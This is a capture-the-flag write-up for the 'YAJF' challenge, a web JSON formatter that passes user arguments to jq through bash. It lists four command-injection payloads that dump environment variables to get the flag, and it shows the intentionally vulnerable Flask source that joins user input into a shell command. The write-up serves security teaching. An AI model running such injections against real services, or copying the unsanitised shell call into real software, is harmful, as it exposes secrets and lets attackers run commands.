## YAJF

Yet Another JSON Formatter.

Do you know `jq`? `jq` is a lightweight and flexible JSON processor.

P.S. The flag is inside an environment variable.

---

An online JSON formatting tool that examines command injection.

It's easy to see from the packet capture that the tool is POSTing raw JSON and formatted parameters to the backend for processing. The title description explicitly uses [`jq`](https://jqlang.github.io/jq/), and [`jq`](https://jqlang.github.io/jq/) is a command-line tool, and several of the formatting parameters passed in happen to match those in the [`jq`](https://jqlang.github.io/jq/) documentation. It's not hard to smell a hint of command injection.

![](https://s2.loli.net/2024/04/26/DJYbZyvnHBmCeqp.png)


After some fuzzing, it can be found that controlling only the `json` parameter cannot achieve command execution. This is actually because `json` is directly inputted as ` stdin` and is not part of the command. By controlling the `args` parameter, command execution can be achieved, but it is required that the length of each `args` cannot exceed 5, and the output must be a valid JSON.

![](https://s2.loli.net/2024/04/26/hD4BP2O1qSzYsmA.png)

![](https://s2.loli.net/2024/04/26/NBePuXQCVg9J5xT.png)

It is not difficult to meet these requirements, and a simple way is to use pipeline operators to convert the output of the `env` command into legal JSON through `jq -R`. There are a variety of solutions seen in player's writeups. Below are some brief examples for reference.

```plain
args=|env|&args=jq&args=-R&json={}
args=<<<&args=`env`&args=-R&json={}
args=;echo&args=\"&args=$FLAG&args=\"&json={}
args=;&args=echo&args=[\"&args=`&args=env&args=`&args=\"]
```

> Did you know?
>
> A single number and a double quoted string are all valid JSON.

Finally, let me reveal how the commands are concatenated. But we can all execute commands now, so it shouldn't be difficult to drag out a copy of the source code to see.

```python
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        args = request.form.getlist("args")
        json = request.form.get("json", "")
        # Limit argument length
        for arg in args:
            if len(arg) > 5:
                return render_template(
                    "index.html",
                    error="One or more arguments are too long.",
                    args=args,
                    json=json,
                )
        try:
            formatted = subprocess.check_output(
                ["bash", "-c", f'jq . {" ".join(args)}'],
                input=json,
                text=True,
                stderr=subprocess.STDOUT,
            )
            # Require output to be valid JSON
            try:
                subprocess.check_output(
                    ["jq", "."], input=formatted, text=True, stderr=subprocess.STDOUT
                )
            except subprocess.CalledProcessError:
                return render_template(
                    "index.html",
                    error="Oh, no! Formatted text isn't valid JSON! Are you a hacker?",
                    args=args,
                    json=json,
                )
        except subprocess.CalledProcessError as e:
            try:
                error = e.output.splitlines()[0].strip()
                if error.startswith("jq: parse error:"):
                    error = f"P{error[5:]}"
                else:
                    error = "Internal server error."
            except:
                error = "Internal server error."
            return render_template("index.html", error=error, args=args, json=json)
        return render_template("index.html", args=args, json=formatted)
    return render_template("index.html")
```